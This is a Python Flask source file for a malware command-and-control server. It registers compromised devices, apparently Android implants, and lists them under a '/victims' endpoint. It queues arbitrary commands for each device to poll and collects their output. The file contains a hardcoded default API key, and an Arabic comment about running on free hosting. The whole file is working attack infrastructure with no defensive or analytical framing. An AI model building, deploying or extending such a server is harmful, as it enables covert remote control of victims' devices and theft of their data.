import os, sqlite3, json
from flask import Flask, request, jsonify, send_file, abort

API_KEY = os.getenv("C2_API_KEY", "dotbhai_cloud_key")
app = Flask(__name__)

# سنستخدم قاعدة بيانات مؤقتة بالذاكرة لأن الاستضافة المجانية تمسح الملفات
conn = sqlite3.connect(":memory:", check_same_thread=False)
conn.row_factory = sqlite3.Row
conn.execute("CREATE TABLE devices(id TEXT PRIMARY KEY, device TEXT, sdk TEXT, ip TEXT, last_seen DATETIME DEFAULT CURRENT_TIMESTAMP)")
conn.execute("CREATE TABLE tasks(rowid INTEGER PRIMARY KEY AUTOINCREMENT, id TEXT, cmd TEXT, created DATETIME DEFAULT CURRENT_TIMESTAMP)")
conn.execute("CREATE TABLE results(rowid INTEGER PRIMARY KEY AUTOINCREMENT, id TEXT, output TEXT, created DATETIME DEFAULT CURRENT_TIMESTAMP)")

def auth():
    if request.headers.get("X-API-Key") != API_KEY: abort(401)

@app.route("/")
def home(): return "C2 is Online and Running 24/7!"

@app.route("/register", methods=["POST"])
def register():
    d = request.get_json(force=True)
    conn.execute("INSERT OR REPLACE INTO devices(id, device, sdk, ip, last_seen) VALUES(?,?,?,?,CURRENT_TIMESTAMP)", (d.get("id"), d.get("device"), d.get("sdk"), request.remote_addr))
    conn.commit()
    return "ok"

@app.route("/poll")
def poll():
    id_ = request.args.get("id")
    conn.execute("UPDATE devices SET last_seen=CURRENT_TIMESTAMP WHERE id=?", (id_,))
    conn.commit()
    row = conn.execute("SELECT rowid, cmd FROM tasks WHERE id=? ORDER BY rowid LIMIT 1", (id_,)).fetchone()
    if not row: return ("", 200)
    conn.execute("DELETE FROM tasks WHERE rowid=?", (row["rowid"],))
    conn.commit()
    return row["cmd"]

@app.route("/result", methods=["POST"])
def result():
    id_ = request.args.get("id")
    conn.execute("INSERT INTO results(id, output) VALUES(?,?)", (id_, request.data.decode(errors="replace")))
    conn.commit()
    return "ok"

@app.route("/victims")
def victims():
    auth()
    rows = conn.execute("SELECT * FROM devices ORDER BY last_seen DESC").fetchall()
    return jsonify([dict(r) for r in rows])

@app.route("/push", methods=["POST"])
def push():
    auth()
    conn.execute("INSERT INTO tasks(id, cmd) VALUES(?,?)", (request.args.get("id"), request.data.decode().strip()))
    conn.commit()
    return "queued"

@app.route("/results")
def get_results():
    auth()
    rows = conn.execute("SELECT * FROM results WHERE id=? ORDER BY rowid DESC LIMIT 50", (request.args.get("id"),)).fetchall()
    return jsonify([dict(r) for r in rows])

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
